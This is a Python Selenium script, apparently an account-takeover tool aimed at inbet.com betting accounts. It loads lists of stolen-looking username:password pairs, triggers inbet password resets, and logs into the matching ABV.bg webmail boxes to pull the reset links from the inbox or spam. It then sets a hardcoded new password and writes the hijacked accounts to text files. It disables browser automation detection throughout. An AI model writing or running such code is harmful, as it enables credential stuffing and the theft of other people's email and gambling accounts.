import html
import re
import logging
import os
import time
import traceback
from concurrent.futures import ThreadPoolExecutor
import undetected_chromedriver as uc
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import WebDriverException, TimeoutException
from threading import Lock

file_lock = Lock()

# Suppress informational messages from undetected_chromedriver
logging.getLogger("undetected_chromedriver").setLevel(logging.ERROR)

def read_credentials(file_path):
    """Reads credentials from a file (format: username:password) and returns a list of [username, password] pairs."""
    if not os.path.exists(file_path):
        print(f"[ERROR] Credentials file not found: {file_path}")
        return []
    with open(file_path, 'r', encoding='utf-8') as file:
        credentials = [line.strip().split(':', 1) for line in file if ':' in line.strip()]
    return credentials

def init_driver(block_images=True):
    """Initializes undetected_chromedriver with options, optionally blocking images for faster loading."""
    options = uc.ChromeOptions()
    #options.add_argument("--headless")  # Uncomment for headless mode
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--incognito")  # Run in incognito mode for a clean session
    if block_images:
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)
    driver = uc.Chrome(options=options, version_main=143)
    driver.maximize_window()
    return driver

def get_with_retry(driver, url, retries=2):
    """Attempts to load a URL with retries on connection timeout."""
    for attempt in range(retries):
        try:
            driver.get(url)
            return
        except WebDriverException as e:
            if "net::ERR_CONNECTION_TIMED_OUT" in str(e):
                print(f"[WARNING] Connection timed out, retrying ({attempt+1}/{retries})...")
                time.sleep(2)
            else:
                raise
    raise WebDriverException(f"Failed to connect to {url} after {retries} attempts")

def get_search_input(driver, timeout=5):
    """Try multiple selectors for the search input."""
    candidates = [
        "/html/body/div[1]/div/div[4]/div/div[4]/div/div[4]/div/div[2]/div/div[2]/div/div[1]/div/div/div[2]/input",
        "//input[contains(@class,'search') and @type='text']",
        "//input[@placeholder='Търси']",
    ]

    for xp in candidates:
        try:
            return WebDriverWait(driver, timeout).until(
                EC.visibility_of_element_located((By.XPATH, xp))
            )
        except Exception:
            continue

    return None

def has_search_results(driver, timeout=5):
    try:
        WebDriverWait(driver, timeout).until(
            EC.presence_of_element_located((
                By.XPATH,
                "//table//tr[contains(@class,'mailRow') or contains(@class,'row')]"
            ))
        )
        return True
    except Exception:
        return False

def login(cred_pair):
    """Handles login and URL extraction for inbet and ABV.bg accounts."""
    inbet_cred, abv_cred = cred_pair
    inbet_username, inbet_password = inbet_cred
    abv_username, abv_password = abv_cred

    driver = init_driver()
    try:
        # **inbet Login Process**
        get_with_retry(driver, login_page_url)
        print(f"[DEBUG] Opened {login_page_url} for {inbet_username}")

        new_username_field = WebDriverWait(driver, 30).until(
            EC.visibility_of_element_located(
                (By.XPATH, "//input[@name='Email' or contains(@placeholder,'Имейл')]")
            )
        )
        new_username_field.clear()
        new_username_field.send_keys(inbet_username)
        print(f"[DEBUG] Filled username for {inbet_username}")

        button = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable(
                (By.XPATH, "//button[@type='submit' and @data-qid='regFinish']")
            )
        )
        button.click()
        print(f"[DEBUG] Clicked button after username for {inbet_username}")

        # ===========================
        # NEW: open ABV.bg ONLY IF this element pops up:
        # /html/body/div[3]/div[2]/main/div/div/div/div[2]/div/p
        # ===========================
        popup_xpath = "/html/body/div[3]/div[2]/main/div/div/div/div[2]/div/p"
        try:
            popup_element = WebDriverWait(driver, 30).until(
                EC.visibility_of_element_located((By.XPATH, popup_xpath))
            )
            popup_text = popup_element.text
            with open("checkemailexist.txt", 'a', encoding='utf-8') as file:
                file.write(f"{inbet_username}:{inbet_password} {popup_text}\n")
            print(f"[DEBUG] Popup message for {inbet_username}: {popup_text}")
        except TimeoutException:
            print(f"[WARNING] Popup element {popup_xpath} not found for {inbet_username}. Skipping ABV.")
            return  # do NOT continue to ABV, just finish this credential

        # ========= OLD MESSAGE BLOCK REMOVED / REPLACED BY ABOVE =========
        # If you still need the old /div[3]/div[3]/... messages,
        # you can add another try/except here, but ABV will open
        # only when popup_xpath is present.
        # ================================================================

        # **Open ABV.bg in a new tab (only if popup was found)**
        driver.execute_script("window.open('');")
        driver.switch_to.window(driver.window_handles[1])
        get_with_retry(driver, "https://www.abv.bg")
        print(f"[DEBUG] Navigated to www.abv.bg for {abv_username}")

        try:
            cookie_button = WebDriverWait(driver, 30).until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div/div[2]/div[2]/div[2]/div[2]/button[1]/p"))
            )
            cookie_button.click()
            print(f"[DEBUG] Clicked cookie accept for {abv_username}")
        except TimeoutException:
            print(f"[INFO] No cookie button found for {abv_username}")

        username_field = WebDriverWait(driver, 30).until(
            EC.visibility_of_element_located((By.XPATH, "/html/body/main/section[1]/div[2]/form/p[1]/input"))
        )
        username_field.send_keys(abv_username)

        password_field = WebDriverWait(driver, 30).until(
            EC.visibility_of_element_located((By.XPATH, "/html/body/main/section[1]/div[2]/form/p[2]/label/input"))
        )
        password_field.send_keys(abv_password)

        login_button = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "/html/body/main/section[1]/div[2]/form/p[3]/input"))
        )
        login_button.click()
        print(f"[DEBUG] Submitted login for {abv_username}")

        WebDriverWait(driver, 30).until_not(
            EC.presence_of_element_located((By.XPATH, "/html/body/main/section[1]/div[2]/form"))
        )
        print(f"[DEBUG] Login successful for {abv_username}")

        # wait mail table
        WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "td.inbox-cellTableCell"))
        )

        RESET_EMAIL_XPATHS = [
            # Layout 1
            "//tr[.//td[contains(@class,'inbox-cellTableSubjectColumn') "
            "and contains(normalize-space(.), 'Забравена парола')]"
            " and .//span[contains(@class,'abv-mailSubject') "
            "and contains(normalize-space(.), 'inbet')]]",

            # Layout 2
            "//tr[.//td[contains(@class,'inbox-right-cellTableSubjectColumn') "
            "and contains(normalize-space(.), 'Забравена парола')]"
            " and .//span[contains(@class,'abv-mailSubject') "
            "and contains(normalize-space(.), 'inbet')]]"
        ]

        SPAM_XPATH = (
            "/html/body/div[1]/div/div[4]/div/div[4]/div/div[2]/div/div[2]/"
            "div/div[4]/div/div[2]/div/div/div/table/tbody[1]/tr[4]/td"
        )


        def find_and_open_reset_email(timeout=8):
            for xp in RESET_EMAIL_XPATHS:
                try:
                    row = WebDriverWait(driver, timeout).until(
                        EC.element_to_be_clickable((By.XPATH, xp))
                    )
                    row.click()
                    return True
                except TimeoutException:
                    continue
            return False

        # 1️⃣ INBOX
        if find_and_open_reset_email():
            print(f"[SUCCESS] inbet reset email found in Inbox for {abv_username}")

        else:
            print("[INFO] Not in Inbox → switching to Spam")

            spam_row = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.XPATH, SPAM_XPATH))
            )
            spam_row.click()

            WebDriverWait(driver, 30).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "td.inbox-cellTableCell"))
            )

            # 2️⃣ SPAM
            if find_and_open_reset_email():
                print(f"[SUCCESS] inbet reset email found in Spam for {abv_username}")
            else:
                print(f"[INFO] inbet reset email NOT found for {abv_username}")
                return
        try:
            reset_p = WebDriverWait(driver, 20).until(
                EC.presence_of_element_located((
                    By.XPATH,
                    "(//p[contains(text(),'https://inbet.com/reset-password')])[1]"
                ))
            )

            raw_text = reset_p.text.strip()
            decoded_text = html.unescape(raw_text)

            # FIRST match only
            match = re.search(r"https://inbet.com/reset-password\?[^\s]+", decoded_text)
            if match:
                reset_url = match.group(0)
                print(f"[INFO] Extracted reset URL: {reset_url}")

                with file_lock:
                    with open("correctpasswordabv.txt", "a", encoding="utf-8") as f:
                        f.write(f"{abv_username}:{abv_password}:{reset_url}\n")

                # ===== AUTO-OPEN RESET LINK (YOUR PATTERN) =====
                driver.execute_script("window.open('');")
                driver.switch_to.window(driver.window_handles[1])
                get_with_retry(driver, reset_url)
                print(f"[DEBUG] Navigated to reset URL for {abv_username}")

            else:
                print("[ERROR] Reset URL not found in first <p>")

        except TimeoutException:
            print(f"[ERROR] Reset <p> element not found for {abv_username}")

        try:
            new_password = "PetarNDimitrov1988"

            new_password_field = WebDriverWait(driver, 30).until(
                EC.presence_of_element_located((By.NAME, "newPassword"))
            )
            confirm_password_field = WebDriverWait(driver, 30).until(
                EC.presence_of_element_located((By.NAME, "confirmNewPassword"))
            )

            new_password_field.clear()
            new_password_field.send_keys(new_password)

            confirm_password_field.clear()
            confirm_password_field.send_keys(new_password)

            WebDriverWait(driver, 30).until(
                EC.element_to_be_clickable((
                    By.XPATH,
                    "//button[@type='submit' and @data-qid='regFinish']"
                ))
            ).click()

            print("[SUCCESS] Password changed successfully")

            with file_lock:
                with open("changedpasswordinbet.txt", "a", encoding="utf-8") as f:
                    f.write(f"{inbet_username}:{new_password}\n")

            time.sleep(2)

        except Exception as e:
            print(f"[ERROR] Password change failed: {e}")
            with open("page_source.html", "w", encoding="utf-8") as f:
                f.write(driver.page_source)

        finally:
            driver.close()
            driver.switch_to.window(original_window)

        # ===== CLEANUP =====
        try:
            driver.delete_all_cookies()
        except Exception:
            pass

    finally:
        driver.quit()
        print(f"Closed browser for {abv_username}, cookies cleared")

def main():
    global login_page_url
    inbet_credentials_file = 'credentialsinbet.txt'
    abv_credentials_file = 'credentialsabvbg.txt'
    success_logins_file = r"C:\inbet\successful_logins_with_data.txt"
    os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)
    login_page_url = "https://inbet.com/forgot-password"

    inbet_credentials = read_credentials(inbet_credentials_file)
    abv_credentials = read_credentials(abv_credentials_file)
    if len(inbet_credentials) != len(abv_credentials):
        print("[ERROR] Mismatch in credential counts")
        return

    credential_pairs = list(zip(inbet_credentials, abv_credentials))
    print(f"[DEBUG] Loaded {len(credential_pairs)} credential pairs")

    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.map(login, credential_pairs)

if __name__ == "__main__":
    main()